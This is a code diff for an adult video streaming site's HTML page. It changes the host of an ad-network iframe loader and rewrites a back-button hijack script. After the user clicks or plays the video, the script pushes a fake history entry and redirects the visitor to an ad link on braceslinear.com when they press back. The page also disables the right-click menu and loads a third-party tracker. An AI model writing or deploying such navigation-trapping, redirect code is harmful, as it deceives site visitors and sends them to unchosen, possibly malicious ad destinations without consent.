@@ -76,16 +76,16 @@
 <body>
 
   <header>
-	<script>
-	atOptions = {
-		'key' : 'e3390cf0a8cdf953ded85bdaaf3046a5',
-		'format' : 'iframe',
-		'height' : 250,
-		'width' : 300,
-		'params' : {}
-	};
-	</script>
-	<script src="https://braceslinear.com/e3390cf0a8cdf953ded85bdaaf3046a5/invoke.js"></script>
+<script>
+  atOptions = {
+    'key' : 'e3390cf0a8cdf953ded85bdaaf3046a5',
+    'format' : 'iframe',
+    'height' : 250,
+    'width' : 300,
+    'params' : {}
+  };
+</script>
+<script src="https://www.highperformanceformat.com/e3390cf0a8cdf953ded85bdaaf3046a5/invoke.js"></script>
   </header>
 
   <div class="container">
@@ -98,29 +98,31 @@
     © 2026 Blacked Streaming. All rights reserved.
   </footer>
 
-  <script type="text/javascript">
-    (function() {
-        const directLink = "https://braceslinear.com/vytbpinkth?key=c12d8e4adc20e53b3071804836fd4575";
+<script type="text/javascript">
+(function () {
+  const directLink = "https://braceslinear.com/d40w8mx5c?key=e15240371508f21838848c29a618630a";
+  const video = document.querySelector("video");
 
-        function lockAndRedirect() {
-            history.pushState(null, null, location.href);
-            
-            window.onpopstate = function() {
-                window.location.replace(directLink);
-            };
-        }
+  if (!video) return;
 
-        window.addEventListener('load', lockAndRedirect);
+  let armed = false;
 
-        document.addEventListener('touchstart', function() {
-            history.pushState(null, null, location.href);
-        }, { once: true });
-        
-        document.addEventListener('click', function() {
-            history.pushState(null, null, location.href);
-        }, { once: true });
-    })();
-  </script>
+  function armBackRedirect() {
+    if (armed) return;
+    armed = true;
+
+    history.pushState(null, null, location.href);
+
+    window.addEventListener("popstate", function () {
+      window.location.href = directLink;
+    });
+  }
+
+  // aktifkan setelah interaksi user
+  video.addEventListener("click", armBackRedirect);
+  video.addEventListener("play", armBackRedirect);
+})();
+</script>
 
   <script>
     document.addEventListener('contextmenu', e => e.preventDefault());
@@ -143,4 +145,5 @@ hs.src = ('//s10.histats.com/js15_as.js');
 <!-- Histats.com  END  -->
 
 </body>
+
 </html>
